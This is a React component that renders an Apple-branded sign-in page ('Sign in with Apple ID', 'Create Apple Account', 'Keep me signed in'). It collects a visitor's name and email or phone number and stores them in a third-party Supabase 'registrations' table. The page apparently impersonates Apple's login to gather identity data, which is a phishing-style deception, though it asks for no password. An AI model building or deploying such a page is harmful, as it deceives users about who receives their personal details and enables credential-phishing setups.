import { useState } from "react";
import { ArrowRight, Loader2, Check } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { toast } from "sonner";
import { z } from "zod";
import ColorfulRing from "./ColorfulRing";

const registrationSchema = z.object({
  email: z.string().trim().email({ message: "Please enter a valid email address" }).max(255),
  name: z.string().trim().min(1, { message: "Name is required" }).max(100),
});

interface RegistrationFormProps {
  onSuccess: (data: { email: string; name: string }) => void;
}

const RegistrationForm = ({ onSuccess }: RegistrationFormProps) => {
  const [email, setEmail] = useState("");
  const [name, setName] = useState("");
  const [step, setStep] = useState<"name" | "email">("name");
  const [isLoading, setIsLoading] = useState(false);
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [error, setError] = useState("");
  const [isInputFocused, setIsInputFocused] = useState(false);

  const handleSubmitName = (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    
    if (!name.trim()) {
      setError("Please enter your name");
      return;
    }
    
    if (name.length > 100) {
      setError("Name must be less than 100 characters");
      return;
    }
    
    setStep("email");
  };

  const handleSubmitEmail = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");

    const result = registrationSchema.safeParse({ email, name });
    if (!result.success) {
      const emailError = result.error.errors.find(err => err.path[0] === "email");
      setError(emailError?.message || "Invalid input");
      return;
    }

    setIsLoading(true);

    try {
      const { error: dbError } = await supabase
        .from("registrations")
        .insert([{ email: result.data.email, name: result.data.name }]);

      if (dbError) {
        toast.error("Registration failed. Please try again.");
        return;
      }

      onSuccess({ email: result.data.email, name: result.data.name });
    } catch (err) {
      toast.error("Something went wrong. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  const currentValue = step === "name" ? name : email;
  const setCurrentValue = step === "name" ? setName : setEmail;
  const placeholder = step === "name" ? "Enter your name" : "Email or Phone Number";
  const inputType = step === "name" ? "text" : "email";

  return (
    <div className="w-full max-w-[440px] md:bg-card md:shadow-2xl md:rounded-[2rem] p-6 md:p-12 transition-all duration-300 transform md:border border-border/50 animate-scale-in">
      {/* Logo Animation Section */}
      <ColorfulRing />

      {/* Title */}
      <h1 className="text-[28px] font-semibold text-center mb-10 leading-snug text-foreground">
        Sign in with Apple ID
      </h1>

      {/* Input Form with Floating Label */}
      <form onSubmit={step === "name" ? handleSubmitName : handleSubmitEmail} className="mb-8">
        <div className="relative group">
          <div
            className={`
              relative flex items-center w-full h-[56px] rounded-xl border transition-all duration-200 ease-in-out
              ${isInputFocused ? 'border-primary ring-1 ring-primary' : 'border-border hover:border-muted-foreground'}
            `}
          >
            <input
              type={inputType}
              value={currentValue}
              onChange={(e) => setCurrentValue(e.target.value)}
              onFocus={() => setIsInputFocused(true)}
              onBlur={() => setIsInputFocused(false)}
              className="w-full h-full px-4 pt-1 bg-transparent outline-none text-[17px] z-10 placeholder-transparent text-foreground"
              id="apple-id"
              placeholder={placeholder}
              autoComplete={step === "name" ? "name" : "username"}
              disabled={isLoading}
              autoFocus
            />
            
            {/* Floating Label / Placeholder */}
            <label
              htmlFor="apple-id"
              className={`
                absolute left-4 text-muted-foreground transition-all duration-200 pointer-events-none
                ${(isInputFocused || currentValue) ? 'text-xs top-2 opacity-100' : 'text-[17px] top-[17px] opacity-60'}
              `}
            >
              {placeholder}
            </label>

            {/* Arrow Button */}
            <button
              type="submit"
              disabled={isLoading}
              className={`
                absolute right-2 w-8 h-8 rounded-full flex items-center justify-center transition-all duration-200 z-20 focus:outline-none
                ${currentValue ? 'bg-primary text-primary-foreground cursor-pointer rotate-0 opacity-100' : 'bg-transparent text-muted-foreground cursor-default -rotate-90 opacity-0'}
              `}
            >
              {isLoading ? (
                <Loader2 className="w-5 h-5 animate-spin" />
              ) : (
                <ArrowRight className="w-5 h-5" strokeWidth={2.5} />
              )}
            </button>
          </div>
        </div>
        
        {error && (
          <p className="mt-2 text-sm text-destructive text-center">{error}</p>
        )}
      </form>

      {/* Keep me signed in Checkbox */}
      <div className="flex items-center justify-center gap-2 mb-12">
        <div
          onClick={() => setKeepSignedIn(!keepSignedIn)}
          role="checkbox"
          aria-checked={keepSignedIn}
          tabIndex={0}
          className={`
            w-5 h-5 rounded border cursor-pointer flex items-center justify-center transition-all duration-150
            ${keepSignedIn ? 'bg-primary border-primary' : 'border-muted-foreground bg-card hover:border-primary'}
          `}
        >
          {keepSignedIn && <Check className="w-3.5 h-3.5 text-primary-foreground" strokeWidth={3} />}
        </div>
        <span
          className="text-[15px] text-foreground cursor-pointer select-none"
          onClick={() => setKeepSignedIn(!keepSignedIn)}
        >
          Keep me signed in
        </span>
      </div>

      {/* Footer Links */}
      <div className="flex flex-col items-center gap-2 text-[13px] md:text-[14px]">
        {step === "email" && (
          <button
            type="button"
            onClick={() => setStep("name")}
            className="text-primary hover:underline font-medium"
          >
            ← Back to name
          </button>
        )}
        <a href="#" className="text-primary hover:underline flex items-center gap-1 font-medium">
          Forgot password?
          <span className="text-[10px] align-top">↗</span>
        </a>
        <a href="#" className="text-primary hover:underline font-medium">
          Create Apple Account
        </a>
      </div>
    </div>
  );
};

export default RegistrationForm;
